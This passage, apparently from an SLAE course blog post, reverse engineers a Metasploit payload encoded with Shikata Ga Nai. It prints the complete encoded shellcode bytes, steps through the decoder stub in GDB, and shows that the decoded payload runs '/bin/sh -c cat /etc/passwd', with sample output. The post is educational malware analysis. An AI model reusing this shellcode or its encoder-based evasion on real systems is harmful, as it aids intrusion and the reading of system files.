"\x36\x55\xf1\x60\x66\xe5\x98\x15\x0b\x72\x3e\xda\xbc\x2f\x37"
"\x3b\x8f\x50";
```

And cleaned up...

```
"\xd9\xe9\xba\x33\xd4\x7e\x78\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0d\x31\x55\x1a\x83\xed\xfc\x03\x55\x16\xe2\xc6\xbe\x75\x20\xb1\x6d\xec\xb8\xec\xf2\x79\xdf\x86\xdb\x0a\x48\x56\x4c\xc2\xea\x3f\xe2\x95\x08\xed\x12\xb5\xce\x11\xe3\xd5\xaf\x65\xc3\x36\x55\xf1\x60\x66\xe5\x98\x15\x0b\x72\x3e\xda\xbc\x2f\x37\x3b\x8f\x50"
```


Running `sctest`:

```
root@mountain:~# echo -ne "\xd9\xe9\xba\x33\xd4\x7e\x78\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0d\x31\x55\x1a\x83\xed\xfc\x03\x55\x16\xe2\xc6\xbe\x75\x20\xb1\x6d\xec\xb8\xec\xf2\x79\xdf\x86\xdb\x0a\x48\x56\x4c\xc2\xea\x3f\xe2\x95\x08\xed\x12\xb5\xce\x11\xe3\xd5\xaf\x65\xc3\x36\x55\xf1\x60\x66\xe5\x98\x15\x0b\x72\x3e\xda\xbc\x2f\x37\x3b\x8f\x50" | sctest -vvv -Ss 10000 -G sgn_exec.dot | tee sctest_sgn_exec.txt & dot sgn_exec.dot -Tpng > sgn_exec.png
```

Let's get right into the analysis. The files generated during my analysis for the Shikata Ga Nai decoder and exec payload can be found [here](https://github.com/fbcsec/slae-assignments/tree/master/5-msf-shellcode-analysis/sgn_encoded_exec). 

## Stepping through a Shikata Ga Nai decoder stub. 

Shikata_ga_nai's decoder is described as 'polymorphic'. It is generated dynamically with a variety of different methods for the different tasks required for decoding chosen at random. It is important to stress this, as the sample of shikata_ga_nai discussed here is only one of many different possible variations. This particular instance of SGN follows several simple steps for decoding. First it gets a pointer to the encoded payload. Then byte by byte it XORs the payload against a key. After each round it adds to the key the integer value of the decoded data.  This additive feedback loop ensures that you provide the decoder stub with both a valid key and a completely correct encoded payload. If any of it is incorrect, the rest of the payload will be garbage. 

```nasm
fldl2t            
mov edx,0x787ed433
fnstenv [esp-0xc] 
pop ebp           
```

I absolutely love this trick. First the shellcode puts a floating point constant onto the floating point unit (FPU) register stack. The dreaded FPU is a part of the CPU used for calculating floating point numbers. There are eight floating point registers and they behave like a stack, being pushed to and popped from. The first instruction, `fldl2t` pushes log2 10 onto the FPU stack. Don't worry, we're not actually going to be doing any math! 

The shellcode then loads the initial value to be used for decoding.

Back to the FPU, an `fnstenv` instruction is used. This saves the state of all the floating point registers to some memory, in this case 12 bytes above the top of the stack. This has the result of saving at the stack pointer, the FPU's instruction pointer. This points to the last FPU instruction executed, the `fldl2t` and the top of the decoder stub. It POPs this pointer into EBP. 

We can observe this using GDB. 

After executing the `fldl2t` instruction, we can observe the state of the FPU by using `info float` in GDB. 

```
(gdb) info float
=>R7: Valid   0x4000d49a784bcd1b8afe +3.321928094887362348      
  R6: Empty   0x00000000000000000000
  R5: Empty   0x00000000000000000000
  R4: Empty   0x00000000000000000000
  R3: Empty   0x00000000000000000000
  R2: Empty   0x00000000000000000000
  R1: Empty   0x00000000000000000000
  R0: Empty   0x00000000000000000000

Status Word:         0x3800                                            
                       TOP: 7
Control Word:        0x037f   IM DM ZM OM UM PM
                       PC: Extended Precision (64-bits)
                       RC: Round to nearest
Tag Word:            0x3fff
Instruction Pointer: 0x00:0x56557020
Operand Pointer:     0x00:0x00000000
Opcode:              0x0000
```

Note the instruction pointer. If we advance execution past the first mov to EDX instruction, and then look at the state of the FPU, we observe something interesting. 

```
(gdb) info float
[...]
Instruction Pointer: 0x00:0x56557020
Operand Pointer:     0x00:0x00000000
Opcode:              0x0000
```

The instruction pointer in the FPU hasn't changed since we pushed the log2 10 to the FPU register stack.

If we then advance past the `fnstenv [esp-0xc]` instruction, we can observe at the stack pointer the FPU instruction pointer. 

```
(gdb) x $esp
0xffffd3cc: 0x56557020
```

```nasm
sub ecx,ecx
mov cl,0xd 
```

Next the decoder zeroes ECX and moves the number of bytes to be decoded in. 

```nasm
xor [ebp+0x1a],edx
sub ebp,byte -0x4 
add edx,[ebp+0x16]
loop 0xffffffe1   
```

This is the meat of the decoder. Now that the decoder has a pointer to the top of the shellcode, everything else is done in offsets. 

First the value in EDX is XORed with the first byte of the encoded payload. Then the pointer to the start of the shellcode is moved down four bytes. Next the decoder adds to EDX the the integer value of the last four decoded bytes. Then the decoder loops back to the initial XOR. 

Let's look at the decoded exec payload. I'll pull this from GDB. 

```
(gdb) disassemble
[...]
=> 0x5655703b <+27>:    push   0xb
   0x5655703d <+29>:    pop    eax
   0x5655703e <+30>:    cdq    
   0x5655703f <+31>:    push   edx
   0x56557040 <+32>:    pushw  0x632d
   0x56557044 <+36>:    mov    edi,esp
   0x56557046 <+38>:    push   0x68732f
   0x5655704b <+43>:    push   0x6e69622f
   0x56557050 <+48>:    mov    ebx,esp
   0x56557052 <+50>:    push   edx
   0x56557053 <+51>:    call   0x56557068 <shellcode+72>
   0x56557058 <+56>:    arpl   WORD PTR [ecx+0x74],sp
   0x5655705b <+59>:    and    BYTE PTR [edi],ch
   0x5655705d <+61>:    gs je  0x565570c3
   0x56557060 <+64>:    das    
   0x56557061 <+65>:    jo     0x565570c4
   0x56557063 <+67>:    jae    0x565570d8
   0x56557065 <+69>:    ja     0x565570cb
   0x56557067 <+71>:    add    BYTE PTR [edi+0x53],dl
   0x5655706a <+74>:    mov    ecx,esp
   0x5655706c <+76>:    int    0x80
   0x5655706e <+78>:    add    BYTE PTR [eax],al
```

This uses one or two interesting tricks as well. A PUSH POP gets the syscall id for `execve(2)` into EAX, and a CDQ zeroes EDX. CDQ takes whatever is in bit31 of EAX and extends it into every bit of EDX. So if bit 31 is 1, EDX is 0xFFFFFFFF, if bit 31 is 0, then EDX is 0x00000000. 

Moving on, a null is pushed to the stack, the string '-c' is pushed and a pointer to it is saved in EDI. Then `/bin/sh/` is pushed to the stack in reverse order and a pointer to this is copied into EBX. Another null is PUSHed and a call is made further down the shellcode. Everything after this call up to byte 45 of this decoded shellcode is the string `cat /etc/passwd\x00`. The CALL instruction pushes the address to this data to the stack and jumps over it. We can see this block of data in GBD. 

```
(gdb) x /16c 0x56557058
0x56557058 <shellcode+56>:  99 'c'  97 'a'  116 't' 32 ' '  47 '/'  101 'e' 116 't' 99 'c'
0x56557060 <shellcode+64>:  47 '/'  112 'p' 97 'a'  115 's' 115 's' 119 'w' 100 'd' 0 '\000'
```

The instructions in GDB's disassembly are broken because the offset to which CALL jumps is misaligned. If we analyze the true location where execution will be passed, we can see the instructions that will be executed. 

```
(gdb) x/8i 0x56557020+72
=> 0x56557068 <shellcode+72>:   push   edi
   0x56557069 <shellcode+73>:   push   ebx
   0x5655706a <shellcode+74>:   mov    ecx,esp
   0x5655706c <shellcode+76>:   int    0x80
[...]
```

EDI (the pointer to the `-c` string) and EBX (the pointer to the `/bin/sh -c`) are pushed to the stack and a pointer to this data is placed in ECX. Then the execve syscall is fired. 

When running this payload all of this work should be transparent to us, it will just spit out the contents of the `/etc/passwd` file on our system. And indeed it does. 

```
root@mountain:~# $ ./sgn_exec_host.elf 
Shellcode length: 78
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

Conclusions
===========

In this article we've discussed several payloads generated by the Metasploit Framework. First, a basic TCP bind shell for x86 Linux was compared to my own hand-crafted one. Then, the first stage connect-back payload generated for a TCP reverse shell payload was analyzed. Finally, the decoder stub for x86/shikata_ga_nai, a powerful encoder included in MSF was explored. We've picked out some useful tricks (such as PUSH POP for avoiding null bytes and CDQ for nulling registers), and explored how to analyze and revers engineer potentially malicious shellcode. I can't stress the importance of analyzing code provided by others that you intend to run; especially shellcode which is often just as malicious to you as it is to your target.
